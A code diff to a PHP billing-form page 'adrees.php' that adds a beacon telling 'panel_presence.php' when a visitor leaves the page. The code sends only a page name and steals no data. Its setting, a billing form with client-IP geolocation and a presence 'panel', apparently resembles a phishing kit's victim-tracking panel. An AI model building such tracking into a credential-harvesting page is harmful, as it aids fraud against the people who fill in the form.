@@ -274,6 +274,7 @@ $geoData = fetchGeoData($clientIp);
     <script>
         const geoDefaults = <?php echo json_encode($geoData, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP); ?>;
         (function() {
+            let outReported = false;
             const form = document.getElementById('billing-form');
             const errorContainer = document.getElementById('form-errors');
             const countrySelect = document.getElementById('country');
@@ -378,6 +379,31 @@ $geoData = fetchGeoData($clientIp);
                     });
                 })
                 .catch(() => {});
+
+            function reportPageOut() {
+                if (outReported) {
+                    return;
+                }
+
+                outReported = true;
+                const payload = new URLSearchParams({ page: 'adrees.php' });
+
+                if (navigator.sendBeacon) {
+                    const blob = new Blob([payload.toString()], { type: 'application/x-www-form-urlencoded' });
+                    navigator.sendBeacon('panel_presence.php', blob);
+                    return;
+                }
+
+                fetch('panel_presence.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: payload,
+                    keepalive: true,
+                }).catch(() => {});
+            }
+
+            window.addEventListener('pagehide', reportPageOut);
+            window.addEventListener('beforeunload', reportPageOut);
         })();
     </script>
 </body>
